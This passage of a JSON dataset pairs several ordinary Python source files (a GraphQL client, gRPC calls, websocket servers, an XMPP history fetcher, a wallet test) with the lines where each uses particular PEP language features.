ExecutionResult:\n        try:\n            answer = await super()._execute(\n                document,\n                variable_values=variable_values,\n                operation_name=operation_name,\n                serialize_variables=serialize_variables,\n                parse_result=parse_result,\n                **kwargs,\n            )\n        except TransportClosed:\n            self._reconnect_request_event.set()\n            raise\n        return answer\n    async def _execute(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = None,\n        operation_name: Optional[str] = None,\n        serialize_variables: Optional[bool] = None,\n        parse_result: Optional[bool] = None,\n        **kwargs,\n    ) -> ExecutionResult:\n        return await self._execute_with_retries(\n            document,\n            variable_values=variable_values,\n            operation_name=operation_name,\n            serialize_variables=serialize_variables,\n            parse_result=parse_result,\n            **kwargs,\n        )\n    async def _subscribe(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = None,\n        operation_name: Optional[str] = None,\n        serialize_variables: Optional[bool] = None,\n        parse_result: Optional[bool] = None,\n        **kwargs,\n    ) -> AsyncGenerator[ExecutionResult, None]:\n        inner_generator: AsyncGenerator[ExecutionResult, None] = super()._subscribe(\n            document,\n            variable_values=variable_values,\n            operation_name=operation_name,\n            serialize_variables=serialize_variables,\n            parse_result=parse_result,\n            **kwargs,\n        )\n        try:\n            async for result in inner_generator:\n                yield result\n        except TransportClosed:\n            self._reconnect_request_event.set()\n            raise\n        finally:\n            await inner_generator.aclose()",
            "patterns": {
                "pep_468": [
                    [
                        154,
                        "session.execute(\n                document,\n                variable_values=variable_values,\n                operation_name=operation_name,\n                serialize_variables=serialize_variables,\n                parse_result=parse_result,\n                get_execution_result=get_execution_result,\n                **kwargs,\n            )"
                    ],
                    [
                        213,
                        "session.execute(\n                document,\n                variable_values=variable_values,\n                operation_name=operation_name,\n                serialize_variables=serialize_variables,\n                parse_result=parse_result,\n                get_execution_result=get_execution_result,\n                **kwargs,\n            )"
                    ],
                    [
                        286,
                        "self.execute_async(\n                    document,\n                    variable_values=variable_values,\n                    operation_name=operation_name,\n                    serialize_variables=serialize_variables,\n                    parse_result=parse_result,\n                    get_execution_result=get_execution_result,\n                    **kwargs,\n                )"
                    ],
                    [
                        298,
                        "self.execute_sync(\n                document,\n                variable_values=variable_values,\n                operation_name=operation_name,\n                serialize_variables=serialize_variables,\n                parse_result=parse_result,\n                get_execution_result=get_execution_result,\n                **kwargs,\n            )"
                    ],
                    [
                        361,
                        "session.subscribe(\n                document,\n                variable_values=variable_values,\n                operation_name=operation_name,\n                serialize_variables=serialize_variables,\n                parse_result=parse_result,\n                get_execution_result=get_execution_result,\n                **kwargs,\n            )"
                    ],
                    [
                        437,
                        "self.subscribe_async(\n            document,\n            variable_values=variable_values,\n            operation_name=operation_name,\n            serialize_variables=serialize_variables,\n            parse_result=parse_result,\n            get_execution_result=get_execution_result,\n            **kwargs,\n        )"
                    ],
                    [
                        474,
                        "ReconnectingAsyncClientSession(client=self, **kwargs)"
                    ],
                    [
                        540,
                        "self.transport.execute(\n            document,\n            variable_values=variable_values,\n            operation_name=operation_name,\n            **kwargs,\n        )"
                    ],
                    [
                        604,
                        "self._execute(\n            document,\n            variable_values=variable_values,\n            operation_name=operation_name,\n            serialize_variables=serialize_variables,\n            parse_result=parse_result,\n            **kwargs,\n        )"
                    ],
                    [
                        658,
                        "self.transport.subscribe(\n            document,\n            variable_values=variable_values,\n            operation_name=operation_name,\n            **kwargs,\n        )"
                    ],
                    [
                        733,
                        "self._subscribe(\n            document,\n            variable_values=variable_values,\n            operation_name=operation_name,\n            serialize_variables=serialize_variables,\n            parse_result=parse_result,\n            **kwargs,\n        )"
                    ],
                    [
                        779,
                        "self.transport.execute(\n                document,\n                variable_values=variable_values,\n                operation_name=operation_name,\n                **kwargs,\n            )"
                    ],
                    [
                        845,
                        "self._execute(\n            document,\n            variable_values=variable_values,\n            operation_name=operation_name,\n            serialize_variables=serialize_variables,\n            parse_result=parse_result,\n            **kwargs,\n        )"
                    ],
                    [
                        938,
                        "super()._execute(\n                document,\n                variable_values=variable_values,\n                operation_name=operation_name,\n                serialize_variables=serialize_variables,\n                parse_result=parse_result,\n                **kwargs,\n            )"
                    ],
                    [
                        959,
                        "self._execute_with_retries(\n            document,\n            variable_values=variable_values,\n            operation_name=operation_name,\n            serialize_variables=serialize_variables,\n            parse_result=parse_result,\n            **kwargs,\n        )"
                    ],
                    [
                        976,
                        "super()._subscribe(\n            document,\n            variable_values=variable_values,\n            operation_name=operation_name,\n            serialize_variables=serialize_variables,\n            parse_result=parse_result,\n            **kwargs,\n        )"
                    ]
                ],
                "pep_526": [
                    [
                        72,
                        "self.schema: Optional[GraphQLSchema] = schema"
                    ],
                    [
                        73,
                        "self.introspection: Optional[IntrospectionQuery] = introspection"
                    ],
                    [
                        74,
                        "self.transport: Optional[Union[Transport, AsyncTransport]] = transport"
                    ],
                    [
                        75,
                        "self.fetch_schema_from_transport: bool = fetch_schema_from_transport"
                    ],
                    [
                        435,
                        "async_generator: Union["
                    ],
                    [
                        656,
                        "inner_generator: AsyncGenerator["
                    ],
                    [
                        733,
                        "inner_generator: AsyncGenerator[ExecutionResult, None] = self._subscribe("
                    ],
                    [
                        976,
                        "inner_generator: AsyncGenerator[ExecutionResult, None] = super()._subscribe("
                    ],
                    [
                        455,
                        "result: Union["
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_585": [
                    [
                        5,
                        "from typing import (",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        105,
                        "    def execute_sync(",
                        "violation"
                    ],
                    [
                        223,
                        "    def execute(",
                        "violation"
                    ],
                    [
                        556,
                        "    def execute(",
                        "violation"
                    ]
                ],
                "pep_586": [
                    [
                        37,
                        "    from typing import Literal",
                        "import"
                    ]
                ],
                "pep_525": [
                    [
                        348,
                        371,
                        "async generator",
                        "async def subscribe_async(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = None,\n        operation_name: Optional[str] = None,\n        serialize_variables: Optional[bool] = None,\n        parse_result: Optional[bool] = None,\n        get_execution_result: bool = False,\n        **kwargs,\n    ) -> Union[\n        AsyncGenerator[Dict[str, Any], None], AsyncGenerator[ExecutionResult, None]\n    ]:\n        async with self as session:\n            generator = session.subscribe(\n                document,\n                variable_values=variable_values,\n                operation_name=operation_name,\n                serialize_variables=serialize_variables,\n                parse_result=parse_result,\n                get_execution_result=get_execution_result,\n                **kwargs,\n            )\n            async for result in generator:\n                yield result"
                    ],
                    [
                        635,
                        679,
                        "async generator",
                        "async def _subscribe(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = None,\n        operation_name: Optional[str] = None,\n        serialize_variables: Optional[bool] = None,\n        parse_result: Optional[bool] = None,\n        **kwargs,\n    ) -> AsyncGenerator[ExecutionResult, None]:\n        if self.client.schema:\n            self.client.validate(document)\n            if variable_values is not None:\n                if serialize_variables or (\n                    serialize_variables is None and self.client.serialize_variables\n                ):\n                    variable_values = serialize_variable_values(\n                        self.client.schema,\n                        document,\n                        variable_values,\n                        operation_name=operation_name,\n                    )\n        inner_generator: AsyncGenerator[\n            ExecutionResult, None\n        ] = self.transport.subscribe(\n            document,\n            variable_values=variable_values,\n            operation_name=operation_name,\n            **kwargs,\n        )\n        self._generator = inner_generator\n        try:\n            async for result in inner_generator:\n                if self.client.schema:\n                    if parse_result or (\n                        parse_result is None and self.client.parse_results\n                    ):\n                        result.data = parse_result_fn(\n                            self.client.schema,\n                            document,\n                            result.data,\n                            operation_name=operation_name,\n                        )\n                yield result\n        finally:\n            await inner_generator.aclose()"
                    ],
                    [
                        721,
                        756,
                        "async generator",
                        "async def subscribe(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = None,\n        operation_name: Optional[str] = None,\n        serialize_variables: Optional[bool] = None,\n        parse_result: Optional[bool] = None,\n        get_execution_result: bool = False,\n        **kwargs,\n    ) -> Union[\n        AsyncGenerator[Dict[str, Any], None], AsyncGenerator[ExecutionResult, None]\n    ]:\n        inner_generator: AsyncGenerator[ExecutionResult, None] = self._subscribe(\n            document,\n            variable_values=variable_values,\n            operation_name=operation_name,\n            serialize_variables=serialize_variables,\n            parse_result=parse_result,\n            **kwargs,\n        )\n        try:\n            async for result in inner_generator:\n                if result.errors:\n                    raise TransportQueryError(\n                        str_first_element(result.errors),\n                        errors=result.errors,\n                        data=result.data,\n                        extensions=result.extensions,\n                    )\n                elif result.data is not None:\n                    if get_execution_result:\n                        yield result\n                    else:\n                        yield result.data\n        finally:\n            await inner_generator.aclose()"
                    ],
                    [
                        967,
                        991,
                        "async generator",
                        "async def _subscribe(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = None,\n        operation_name: Optional[str] = None,\n        serialize_variables: Optional[bool] = None,\n        parse_result: Optional[bool] = None,\n        **kwargs,\n    ) -> AsyncGenerator[ExecutionResult, None]:\n        inner_generator: AsyncGenerator[ExecutionResult, None] = super()._subscribe(\n            document,\n            variable_values=variable_values,\n            operation_name=operation_name,\n            serialize_variables=serialize_variables,\n            parse_result=parse_result,\n            **kwargs,\n        )\n        try:\n            async for result in inner_generator:\n                yield result\n        except TransportClosed:\n            self._reconnect_request_event.set()\n            raise\n        finally:\n            await inner_generator.aclose()"
                    ],
                    [
                        370,
                        371,
                        "async for",
                        "async for result in generator:\n                yield result"
                    ],
                    [
                        666,
                        677,
                        "async for",
                        "async for result in inner_generator:\n                if self.client.schema:\n                    if parse_result or (\n                        parse_result is None and self.client.parse_results\n                    ):\n                        result.data = parse_result_fn(\n                            self.client.schema,\n                            document,\n                            result.data,\n                            operation_name=operation_name,\n                        )\n                yield result"
                    ],
                    [
                        742,
                        754,
                        "async for",
                        "async for result in inner_generator:\n                if result.errors:\n                    raise TransportQueryError(\n                        str_first_element(result.errors),\n                        errors=result.errors,\n                        data=result.data,\n                        extensions=result.extensions,\n                    )\n                elif result.data is not None:\n                    if get_execution_result:\n                        yield result\n                    else:\n                        yield result.data"
                    ],
                    [
                        985,
                        986,
                        "async for",
                        "async for result in inner_generator:\n                yield result"
                    ]
                ],
                "pep_498": [
                    [
                        93,
                        "                    \"Error while fetching schema: \""
                    ]
                ]
            }
        },
        "130": {
            "file": "import asyncio\nimport grpc\nimport logging\nfrom proto.empty_pb2 import Empty\nfrom typing import List\nfrom config import settings\nfrom proto import model_version_pb2, model_version_pb2_grpc\nasync def get_using_model() -> model_version_pb2.ModelVersionInfo:\n    async with grpc.aio.insecure_channel(settings.model_version_api_listen_port) as channel:\n        stub: model_version_pb2_grpc.ModelVersionStub = model_version_pb2_grpc.ModelVersionStub(channel)\n        metadata = (('access_token', settings.access_token),)\n        response: model_version_pb2.ModelVersionInfo = await stub.GetUsingModelVersion(Empty(), metadata=metadata)\n        return response\nasync def get_model_version_list() -> List[model_version_pb2.ModelVersionInfo]:\n    async with grpc.aio.insecure_channel(settings.model_version_api_listen_port) as channel:\n        stub: model_version_pb2_grpc.ModelVersionStub = model_version_pb2_grpc.ModelVersionStub(channel)\n        metadata = (('access_token', settings.access_token),)\n        model_version_list: List[model_version_pb2.ModelVersionInfo] = []\n        async for model_version in stub.GetAllModelVersion(Empty(), metadata=metadata):\n            model_version_list.append(model_version)\n        return model_version_list\nasync def change(pk: int) -> model_version_pb2.ModelVersionInfo:\n    async with grpc.aio.insecure_channel(settings.model_version_api_listen_port) as channel:\n        stub = model_version_pb2_grpc.ModelVersionStub(channel)\n        metadata = (('access_token', settings.access_token),)\n        changed_model_version: model_version_pb2.ModelVersionInfo = \\\n            await stub.Change(model_version_pb2.SelectedModelVersion(pk=pk), metadata=metadata)\n        return changed_model_version\nif __name__ == '__main__':\n    logging.basicConfig()\n    sample_get_using_model = asyncio.run(get_using_model())\n    sample_get_model_version_list = asyncio.run(get_model_version_list())\n    sample_change = asyncio.run(change(pk=2))",
            "patterns": {
                "pep_526": [
                    [
                        10,
                        "stub: model_version_pb2_grpc.ModelVersionStub = model_version_pb2_grpc.ModelVersionStub(channel)"
                    ],
                    [
                        12,
                        "response: model_version_pb2.ModelVersionInfo = await stub.GetUsingModelVersion(Empty(), metadata=metadata)"
                    ],
                    [
                        16,
                        "stub: model_version_pb2_grpc.ModelVersionStub = model_version_pb2_grpc.ModelVersionStub(channel)"
                    ],
                    [
                        18,
                        "model_version_list: List[model_version_pb2.ModelVersionInfo] = []"
                    ],
                    [
                        26,
                        "changed_model_version: model_version_pb2.ModelVersionInfo = \\"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_585": [
                    [
                        5,
                        "from typing import List",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        18,
                        "        model_version_list: List[model_version_pb2.ModelVersionInfo] = []",
                        "violation"
                    ]
                ],
                "pep_525": [
                    [
                        19,
                        20,
                        "async for",
                        "async for model_version in stub.GetAllModelVersion(Empty(), metadata=metadata):\n            model_version_list.append(model_version)"
                    ]
                ]
            }
        },
        "131": {
            "file": "import asyncio\nimport websockets\nasync def echo(websocket, path):\n    async for message in websocket:\n        await websocket.send(message)\nasyncio.get_event_loop().run_until_complete(\n    websockets.serve(echo, 'localhost', 9001))\nasyncio.get_event_loop().run_forever()",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        4,
                        5,
                        "async for",
                        "async for message in websocket:\n        await websocket.send(message)"
                    ]
                ]
            }
        },
        "132": {
            "file": "from guillotina.commands import Command\nfrom guillotina.commands.utils import change_transaction_strategy\nfrom guillotina.component import get_utility\nfrom guillotina.interfaces import ICatalogUtility\nfrom guillotina.utils import get_containers\nfrom guillotina_elasticsearch.migration import Migrator\nimport asyncio\nimport logging\nimport time\nlogger = logging.getLogger('guillotina_elasticsearch')\nclass printer:\n    def write(self, txt):\n        if isinstance(txt, bytes):\n            txt = txt.decode('utf-8')\n        logger.warning(txt.strip())\nclass MigrateCommand(Command):\n    description = 'Migrate indexes'\n    migrator = None\n    def get_parser(self):\n        parser = super(MigrateCommand, self).get_parser()\n        parser.add_argument('--full', help='Do a full reindex',\n                            action='store_true')\n        parser.add_argument('--force',\n                            help='Override failing migration if existing '\n                                 'migration index exists',\n                            action='store_true')\n        parser.add_argument('--log-details', action='store_true')\n        parser.add_argument('--memory-tracking', action='store_true')\n        parser.add_argument('--reindex-security', action='store_true')\n        parser.add_argument('--mapping-only', action='store_true')\n        return parser\n    async def migrate_all(self, arguments):\n        search = get_utility(ICatalogUtility)\n        change_transaction_strategy('none')\n        await asyncio.sleep(1)  \n        async for _, tm, container in get_containers(self.request):\n            try:\n                self.migrator = Migrator(\n                    search, container, response=printer(), full=arguments.full,\n                    force=arguments.force, log_details=arguments.log_details,\n                    memory_tracking=arguments.memory_tracking,\n                    reindex_security=arguments.reindex_security,\n                    mapping_only=arguments.mapping_only,\n                    cache=False)\n                await self.migrator.run_migration()\n                seconds = int(time.time() - self.migrator.start_time)\n                logger.warning(f)\n            finally:\n                await tm.commit()\n    def run(self, arguments, settings, app):\n        loop = self.get_loop()\n        try:\n            loop.run_until_complete(self.migrate_all(arguments))\n        except KeyboardInterrupt:  \n            pass\n        finally:\n            if self.migrator.status != 'done':\n                loop = self.get_loop()\n                loop.run_until_complete(self.migrator.cancel_migration())",
            "patterns": {
                "pep_567": [
                    [
                        7,
                        7,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        36,
                        49,
                        "async for",
                        "async for _, tm, container in get_containers(self.request):\n            try:\n                self.migrator = Migrator(\n                    search, container, response=printer(), full=arguments.full,\n                    force=arguments.force, log_details=arguments.log_details,\n                    memory_tracking=arguments.memory_tracking,\n                    reindex_security=arguments.reindex_security,\n                    mapping_only=arguments.mapping_only,\n                    cache=False)\n                await self.migrator.run_migration()\n                seconds = int(time.time() - self.migrator.start_time)\n                logger.warning(f)\n            finally:\n                await tm.commit()"
                    ]
                ]
            }
        },
        "133": {
            "file": "import threading\nimport json\nimport asyncio\nimport websockets\nfrom datetime import datetime\nfrom DataBase.DataBase import DataBase\nfrom TokenAuthentication import TokenAuthentication\nclass WebSocketServer(threading.Thread):\n    def __init__(self,  network):\n        self.network = network\n        self.users = set()   \n        threading.Thread.__init__(self)\n        self.setUpServer()\n        print(\"started websocket server\")\n    def setUpServer(self):\n        self.loop = asyncio.new_event_loop()\n        asyncio.set_event_loop(self.loop)\n        while(True):\n            try:\n                self.start_server = websockets.serve(self.handleMessages, self.network.ServerIp,self.network.WebsocketPortNum)\n                break\n            except Exception as exc :\n                self.network.WebsocketPortNum += 1\n                print(\"Port failed to open for websockets\")\n                print(exc)\n    def run(self):\n        self.loop.run_until_complete(self.start_server)\n        self.loop.run_forever()\n    async def register(self, socket):\n        self.users.add(socket)\n    async def unregister(self, socket):\n        self.users.remove(socket)\n    async def NotifyUsers(self, user, content):\n        if self.users:\n            jsonToSend = []\n            message = {}\n            message[\"user\"] = user\n            message[\"message\"] = content\n            jsonToSend.append(message)\n            strJson = json.dumps(jsonToSend)\n            await asyncio.wait([user.send(strJson) for user in self.users])\n    async def handleMessages(self, websocket, path):\n        print(\"socket connected to websocket\")\n        await self.register(websocket)\n        try:\n            async for content in websocket:\n                contentJson = json.loads(content)\n                message =  contentJson[\"message\"]\n                valid, tokenBody = TokenAuthentication.DecodeToken(contentJson[\"Token\"])\n                if not valid:\n                    continue\n                DataBase.GetInstance().AddMessage(message, tokenBody[\"UserName\"])\n                await self.NotifyUsers(tokenBody[\"UserName\"], message)\n        finally:\n            await self.unregister(websocket)",
            "patterns": {
                "pep_567": [
                    [
                        3,
                        3,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        46,
                        53,
                        "async for",
                        "async for content in websocket:\n                contentJson = json.loads(content)\n                message =  contentJson[\"message\"]\n                valid, tokenBody = TokenAuthentication.DecodeToken(contentJson[\"Token\"])\n                if not valid:\n                    continue\n                DataBase.GetInstance().AddMessage(message, tokenBody[\"UserName\"])\n                await self.NotifyUsers(tokenBody[\"UserName\"], message)"
                    ]
                ]
            }
        },
        "134": {
            "file": "import asyncio\nimport logging\nimport random\nfrom datetime import datetime, timedelta, timezone\nfrom hashlib import md5\nfrom typing import (\n    Any,\n    AsyncIterable,\n    Callable,\n    Dict,\n    List,\n    Optional,\n)\nfrom slixmpp import JID, Message as SMessage\nfrom slixmpp.exceptions import IqError, IqTimeout\nfrom poezio.theming import get_theme\nfrom poezio import tabs\nfrom poezio import xhtml, colors\nfrom poezio.config import config\nfrom poezio.common import to_utc\nfrom poezio.text_buffer import TextBuffer, HistoryGap\nfrom poezio.ui.types import (\n    BaseMessage,\n    EndOfArchive,\n    Message,\n)\nlog = logging.getLogger(__name__)\nclass DiscoInfoException(Exception): pass\nclass MAMQueryException(Exception): pass\nclass NoMAMSupportException(Exception): pass\ndef make_line(\n        tab: tabs.ChatTab,\n        text: str,\n        time: datetime,\n        jid: JID,\n        identifier: str = '',\n    ) -> Message:\n    time = time.replace(tzinfo=timezone.utc).astimezone(tz=None)\n    time = time.replace(tzinfo=None)\n    if isinstance(tab, tabs.MucTab):\n        nick = jid.resource\n        user = tab.get_user_by_name(nick)\n        if user:\n            color = user.color\n        else:\n            theme = get_theme()\n            if theme.ccg_palette:\n                fg_color = colors.ccg_text_to_color(theme.ccg_palette, nick)\n                color = fg_color, -1\n            else:\n                mod = len(theme.LIST_COLOR_NICKNAMES)\n                nick_pos = int(md5(nick.encode('utf-8')).hexdigest(), 16) % mod\n                color = theme.LIST_COLOR_NICKNAMES[nick_pos]\n    else:\n        if jid.bare == tab.core.xmpp.boundjid.bare:\n            nick = tab.core.own_nick\n            color = get_theme().COLOR_OWN_NICK\n        else:\n            color = get_theme().COLOR_REMOTE_USER\n            nick = tab.get_nick()\n    return Message(\n        txt=text,\n        identifier=identifier,\n        time=time,\n        nickname=nick,\n        nick_color=color,\n        history=True,\n        user=None,\n    )\nasync def get_mam_iterator(\n        core,\n        groupchat: bool,\n        remote_jid: JID,\n        amount: int,\n        reverse: bool = True,\n        start: Optional[str] = None,\n        end: Optional[str] = None,\n        before: Optional[str] = None,\n    ) -> AsyncIterable[Message]:\n    try:\n        query_jid = remote_jid if groupchat else JID(core.xmpp.boundjid.bare)\n        iq = await core.xmpp.plugin['xep_0030'].get_info(jid=query_jid)\n    except (IqError, IqTimeout):\n        raise DiscoInfoException()\n    if 'urn:xmpp:mam:2' not in iq['disco_info'].get_features():\n        raise NoMAMSupportException()\n    args: Dict[str, Any] = {\n        'iterator': True,\n        'reverse': reverse,\n    }\n    if groupchat:\n        args['jid'] = remote_jid\n    else:\n        args['with_jid'] = remote_jid\n    if amount > 0:\n        args['rsm'] = {'max': amount}\n    args['start'] = start\n    args['end'] = end\n    return core.xmpp['xep_0313'].retrieve(**args)\ndef _parse_message(msg: SMessage) -> Dict:\n    forwarded = msg['mam_result']['forwarded']\n    message = forwarded['stanza']\n    return {\n        'time': forwarded['delay']['stamp'],\n        'jid': message['from'],\n        'text': message['body'],\n        'identifier': message['origin-id']\n    }\nasync def retrieve_messages(tab: tabs.ChatTab,\n                            results: AsyncIterable[SMessage],\n                            amount: int = 100) -> List[BaseMessage]:\n    msg_count = 0\n    msgs = []\n    to_add = []\n    try:\n        async for rsm in results:\n            for msg in rsm['mam']['results']:\n                if msg['mam_result']['forwarded']['stanza'] \\\n                        .xml.find('{%s}%s' % ('jabber:client', 'body')) is not None:\n                    args = _parse_message(msg)\n                    msgs.append(make_line(tab, **args))\n            for msg in reversed(msgs):\n                to_add.append(msg)\n                msg_count += 1\n                if msg_count == amount:\n                    to_add.reverse()\n                    return to_add\n            msgs = []\n        to_add.reverse()\n        return to_add\n    except (IqError, IqTimeout) as exc:\n        log.debug('Unable to complete MAM query: %s', exc, exc_info=True)\n        raise MAMQueryException('Query interrupted')\nasync def fetch_history(tab: tabs.ChatTab,\n                        start: Optional[datetime] = None,\n                        end: Optional[datetime] = None,\n                        amount: int = 100) -> List[BaseMessage]:\n    remote_jid = tab.jid\n    if not end:\n        for msg in tab._text_buffer.messages:\n            if isinstance(msg, Message):\n                end = msg.time\n                end -= timedelta(microseconds=1)\n                break\n    if end is None:\n        end = datetime.now()\n    end = to_utc(end)\n    end_str = datetime.strftime(end, '%Y-%m-%dT%H:%M:%SZ')\n    start_str = None\n    if start is not None:\n        start = to_utc(start)\n        start_str = datetime.strftime(start, '%Y-%m-%dT%H:%M:%SZ')\n    mam_iterator = await get_mam_iterator(\n        core=tab.core,\n        groupchat=isinstance(tab, tabs.MucTab),\n        remote_jid=remote_jid,\n        amount=amount,\n        end=end_str,\n        start=start_str,\n        reverse=True,\n    )\n    return await retrieve_messages(tab, mam_iterator, amount)\nasync def fill_missing_history(tab: tabs.ChatTab, gap: HistoryGap) -> None:\n    start = gap.last_timestamp_before_leave\n    end = gap.first_timestamp_after_join\n    if start:\n        start = start + timedelta(seconds=1)\n    if end:\n        end = end - timedelta(seconds=1)\n    try:\n        messages = await fetch_history(tab, start=start, end=end, amount=999)\n        tab._text_buffer.add_history_messages(messages, gap=gap)\n        if messages:\n            tab.core.refresh_window()\n    except (NoMAMSupportException, MAMQueryException, DiscoInfoException):\n        return\n    finally:\n        tab.query_status = False\nasync def on_new_tab_open(tab: tabs.ChatTab) -> None:\n    amount = 2 * tab.text_win.height\n    end = datetime.now()\n    for message in tab._text_buffer.messages:\n        if isinstance(message, Message) and to_utc(message.time) < to_utc(end):\n            end = message.time\n            break\n    end = end - timedelta(microseconds=1)\n    try:\n        messages = await fetch_history(tab, end=end, amount=amount)\n        tab._text_buffer.add_history_messages(messages)\n        if messages:\n            tab.core.refresh_window()\n    except (NoMAMSupportException, MAMQueryException, DiscoInfoException):\n        return None\n    finally:\n        tab.query_status = False\ndef schedule_tab_open(tab: tabs.ChatTab) -> None:\n    tab.query_status = True\n    asyncio.ensure_future(on_tab_open(tab))\nasync def on_tab_open(tab: tabs.ChatTab) -> None:\n    gap = tab._text_buffer.find_last_gap_muc()\n    if gap is None or not gap.leave_message:\n        await on_new_tab_open(tab)\n    else:\n        await fill_missing_history(tab, gap)\ndef schedule_scroll_up(tab: tabs.ChatTab) -> None:\n    tab.query_status = True\n    asyncio.ensure_future(on_scroll_up(tab))\nasync def on_scroll_up(tab: tabs.ChatTab) -> None:\n    tw = tab.text_win\n    total, pos, height = len(tw.built_lines), tw.pos, tw.height\n    rest = (total - pos) // height\n    if rest > 1:\n        tab.query_status = False\n        return None\n    try:\n        messages = await fetch_history(tab, amount=height)\n        last_message_exists = False\n        if tab._text_buffer.messages:\n            last_message = tab._text_buffer.messages[0]\n            last_message_exists = True\n        if not messages and last_message_exists and not isinstance(last_message, EndOfArchive):\n            time = tab._text_buffer.messages[0].time\n            messages = [EndOfArchive('End of archive reached', time=time)]\n        tab._text_buffer.add_history_messages(messages)\n        if messages:\n            tab.core.refresh_window()\n    except NoMAMSupportException:\n        tab.core.information('MAM not supported for %r' % tab.jid, 'Info')\n        return None\n    except (MAMQueryException, DiscoInfoException):\n        tab.core.information('An error occured when fetching MAM for %r' % tab.jid, 'Error')\n        return None\n    finally:\n        tab.query_status = False",
            "patterns": {
                "pep_468": [
                    [
                        99,
                        "core.xmpp['xep_0313'].retrieve(**args)"
                    ],
                    [
                        121,
                        "make_line(tab, **args)"
                    ]
                ],
                "pep_526": [
                    [
                        87,
                        "args: Dict[str, Any] = {"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_585": [
                    [
                        6,
                        "from typing import (",
                        "suggestion"
                    ],
                    [
                        6,
                        "from typing import (",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        87,
                        "    args: Dict[str, Any] = {",
                        "violation"
                    ]
                ],
                "pep_525": [
                    [
                        116,
                        128,
                        "async for",
                        "async for rsm in results:\n            for msg in rsm['mam']['results']:\n                if msg['mam_result']['forwarded']['stanza'] \\\n                        .xml.find('{%s}%s' % ('jabber:client', 'body')) is not None:\n                    args = _parse_message(msg)\n                    msgs.append(make_line(tab, **args))\n            for msg in reversed(msgs):\n                to_add.append(msg)\n                msg_count += 1\n                if msg_count == amount:\n                    to_add.reverse()\n                    return to_add\n            msgs = []"
                    ]
                ],
                "pep_498v": [
                    [
                        228,
                        228,
                        "%"
                    ],
                    [
                        231,
                        231,
                        "%"
                    ],
                    [
                        119,
                        119,
                        "%"
                    ]
                ]
            }
        },
        "135": {
            "file": "import asyncio\nimport logging\nimport pytest\nfrom hddcoin.rpc.rpc_server import start_rpc_server\nfrom hddcoin.rpc.wallet_rpc_api import WalletRpcApi\nfrom hddcoin.rpc.wallet_rpc_client import WalletRpcClient\nfrom hddcoin.simulator.simulator_protocol import FarmNewBlockProtocol\nfrom hddcoin.types.peer_info import PeerInfo\nfrom hddcoin.util.ints import uint16, uint64\nfrom hddcoin.wallet.util.wallet_types import WalletType\nfrom tests.setup_nodes import self_hostname, setup_simulators_and_wallets, bt\nfrom tests.time_out_assert import time_out_assert\nfrom hddcoin.wallet.did_wallet.did_wallet import DIDWallet\nlog = logging.getLogger(__name__)\n@pytest.fixture(scope=\"module\")\ndef event_loop():\n    loop = asyncio.get_event_loop()\n    yield loop\nclass TestDIDWallet:\n    @pytest.fixture(scope=\"function\")\n    async def three_wallet_nodes(self):\n        async for _ in setup_simulators_and_wallets(1, 3, {}):\n            yield _\n    @pytest.mark.asyncio\n    async def test_create_did(self, three_wallet_nodes):\n        num_blocks = 4\n        full_nodes, wallets = three_wallet_nodes\n        full_node_api = full_nodes[0]\n        full_node_server = full_node_api.server\n        wallet_node_0, wallet_server_0 = wallets[0]\n        wallet_node_1, wallet_server_1 = wallets[1]\n        wallet_node_2, wallet_server_2 = wallets[2]\n        MAX_WAIT_SECS = 30\n        wallet = wallet_node_0.wallet_state_manager.main_wallet\n        ph = await wallet.get_new_puzzlehash()\n        await wallet_server_0.start_client(PeerInfo(self_hostname, uint16(full_node_server._port)), None)\n        await wallet_server_1.start_client(PeerInfo(self_hostname, uint16(full_node_server._port)), None)\n        await wallet_server_2.start_client(PeerInfo(self_hostname, uint16(full_node_server._port)), None)\n        await full_node_api.farm_new_transaction_block(FarmNewBlockProtocol(ph))\n        for i in range(0, num_blocks + 1):\n            await full_node_api.farm_new_transaction_block(FarmNewBlockProtocol(32 * b\"\\0\"))\n        log.info(\"Waiting for initial money in Wallet 0 ...\")\n        api_one = WalletRpcApi(wallet_node_0)\n        config = bt.config\n        daemon_port = config[\"daemon_port\"]\n        test_rpc_port = uint16(21529)\n        await wallet_server_0.start_client(PeerInfo(self_hostname, uint16(full_node_server._port)), None)\n        client = await WalletRpcClient.create(self_hostname, test_rpc_port, bt.root_path, bt.config)\n        rpc_server_cleanup = await start_rpc_server(\n            api_one,\n            self_hostname,\n            daemon_port,\n            test_rpc_port,\n            lambda x: None,\n            bt.root_path,\n            config,\n            connect_to_daemon=False,\n        )\n        async def got_initial_money():\n            balances = await client.get_wallet_balance(\"1\")\n            return balances[\"confirmed_wallet_balance\"] > 0\n        await time_out_assert(timeout=MAX_WAIT_SECS, function=got_initial_money)\n        val = await client.create_new_did_wallet(201)\n        assert isinstance(val, dict)\n        if \"success\" in val:\n            assert val[\"success\"]\n        assert val[\"type\"] == WalletType.DISTRIBUTED_ID.value\n        assert val[\"wallet_id\"] > 1\n        assert len(val[\"my_did\"]) == 64\n        assert bytes.fromhex(val[\"my_did\"])\n        main_wallet_2 = wallet_node_2.wallet_state_manager.main_wallet\n        ph2 = await main_wallet_2.get_new_puzzlehash()\n        for i in range(0, num_blocks + 1):\n            await full_node_api.farm_new_transaction_block(FarmNewBlockProtocol(ph2))\n        recovery_list = 